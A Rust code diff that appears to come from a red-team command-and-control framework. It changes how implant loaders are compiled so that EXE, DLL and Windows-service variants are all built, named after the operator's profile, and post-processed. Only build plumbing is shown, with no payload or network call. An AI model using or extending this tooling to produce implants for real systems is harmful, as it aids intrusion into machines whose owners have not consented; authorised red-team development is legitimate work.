@@ -117,8 +117,6 @@ async fn write_loader_to_tmp(
     implant_profile_name: &str,
     dll_path: &PathBuf,
 ) -> Result<(), String> {
-    let stage_type = StageType::Exe;
-
     let data: NewAgentStaging = match profile.as_staged_agent(implant_profile_name, StageType::All)
     {
         WyrmResult::Ok(d) => d,
@@ -129,70 +127,87 @@ async fn write_loader_to_tmp(
         }
     };
 
-    let cmd_build_output = compile_loader(&data, stage_type, dll_path).await;
-    if let Err(e) = cmd_build_output {
-        let msg = &format!("Failed to build loader. {e}");
-        let _ = remove_dir(&save_path).await?;
-        return Err(msg.to_owned());
+    //
+    // For every build type, build it - we manually specify the loop size here so as more
+    // build options are added, the loop will need to be increased to accommodate.
+    //
+    for i in 0..3 {
+        let stage_type = match i {
+            0 => StageType::Exe,
+            1 => StageType::Dll,
+            2 => StageType::Svc,
+            _ => unreachable!(),
+        };
+
+        let cmd_build_output = compile_loader(&data, stage_type, dll_path).await;
+        if let Err(e) = cmd_build_output {
+            let msg = &format!("Failed to build loader. {e}");
+            let _ = remove_dir(&save_path).await?;
+            return Err(msg.to_owned());
+        }
+
+        let output = cmd_build_output.unwrap();
+        if !output.status.success() {
+            let msg = &format!(
+                "Failed to build loader. {:#?}",
+                String::from_utf8_lossy(&output.stderr),
+            );
+
+            let _ = remove_dir(&save_path).await?;
+
+            return Err(msg.to_owned());
+        }
+
+        //
+        // Move the built implant to where the operator requested it to be built in
+        //
+        let src_dir = if cfg!(windows) {
+            PathBuf::from(format!("./loader/target/release"))
+        } else {
+            PathBuf::from(format!("./loader/target/x86_64-pc-windows-msvc/release"))
+        };
+
+        let out_dir = Path::new(&save_path);
+        let src = match stage_type {
+            StageType::Dll => src_dir.join("loader.dll"),
+            StageType::Exe => src_dir.join("loader.exe"),
+            StageType::Svc => src_dir.join("loader_svc.exe"),
+            StageType::All => unreachable!(),
+        };
+
+        // Format each output file name as loader_{profile name from toml}
+        let ldr_name_fmt = format!("loader_{}", data.pe_name);
+        let mut dest = out_dir.join(ldr_name_fmt);
+
+        if !(match stage_type {
+            StageType::Dll => dest.add_extension("dll"),
+            StageType::Exe => dest.add_extension("exe"),
+            StageType::Svc => dest.add_extension("svc"),
+            StageType::All => unreachable!(),
+        }) {
+            let msg = format!("Failed to add extension to local file. {dest:?}");
+            let _ = remove_dir(&save_path).await?;
+
+            return Err(msg);
+        };
+
+        // Error check..
+        if let Err(e) = tokio::fs::rename(&src, &dest).await {
+            let cwd = current_dir().expect("could not get cwd");
+            let msg = format!(
+                "Failed to rename built loader - it is *possible* you interrupted the request/page, looking for: {}, to rename to: {}. Cwd: {cwd:?} {e}",
+                src.display(),
+                dest.display()
+            );
+            let _ = remove_dir(&save_path).await?;
+
+            return Err(msg);
+        };
+
+        // Apply relevant transformations to the loader too
+        post_process_pe_on_disk(&dest, &data, stage_type).await;
     }
 
-    let output = cmd_build_output.unwrap();
-    if !output.status.success() {
-        let msg = &format!(
-            "Failed to build loader. {:#?}",
-            String::from_utf8_lossy(&output.stderr),
-        );
-
-        let _ = remove_dir(&save_path).await?;
-
-        return Err(msg.to_owned());
-    }
-
-    //
-    // Move the built implant to where the operator requested it to be built in
-    //
-    let src_dir = if cfg!(windows) {
-        PathBuf::from(format!("./loader/target/release"))
-    } else {
-        PathBuf::from(format!("./loader/target/x86_64-pc-windows-msvc/release"))
-    };
-
-    let out_dir = Path::new(&save_path);
-    let src = match stage_type {
-        StageType::Dll => src_dir.join("loader.dll"),
-        StageType::Exe => src_dir.join("loader.exe"),
-        StageType::Svc => src_dir.join("loader_svc.exe"),
-        StageType::All => unreachable!(),
-    };
-
-    // Format each output file name as loader_{profile name from toml}
-    let ldr_name_fmt = format!("loader_{}", data.pe_name);
-    let mut dest = out_dir.join(ldr_name_fmt);
-
-    if !(match stage_type {
-        StageType::Dll => dest.add_extension("dll"),
-        StageType::Exe => dest.add_extension("exe"),
-        StageType::Svc => dest.add_extension("svc"),
-        StageType::All => unreachable!(),
-    }) {
-        let msg = format!("Failed to add extension to local file. {dest:?}");
-        let _ = remove_dir(&save_path).await?;
-
-        return Err(msg);
-    };
-
-    // Error check..
-    if let Err(e) = tokio::fs::rename(&src, &dest).await {
-        let cwd = current_dir().expect("could not get cwd");
-        let msg = format!(
-            "Failed to rename built loader - it is *possible* you interrupted the request/page, looking for: {}, to rename to: {}. Cwd: {cwd:?} {e}",
-            src.display(),
-            dest.display()
-        );
-        let _ = remove_dir(&save_path).await?;
-
-        return Err(msg);
-    };
     Ok(())
 }
 
@@ -204,6 +219,13 @@ async fn compile_loader(
     if stage_type == StageType::All {
         return Err(io::Error::other("StageType::All not supported"));
     }
+
+    let build_as_flags = match stage_type {
+        StageType::Dll => vec!["--lib"],
+        StageType::Exe => vec!["--bin", "loader"],
+        StageType::Svc => vec!["--bin", "loader_svc"],
+        StageType::All => vec![],
+    };
 
     // Check for any feature flags from the profile
     let features: Vec<String> = {
@@ -257,9 +279,7 @@ async fn compile_loader(
 
     cmd.arg("--release");
 
-    // TODO
-    // cmd.args(build_as_flags);
-    cmd.args(features);
+    cmd.args(build_as_flags).args(features);
 
     cmd.output().await
 }
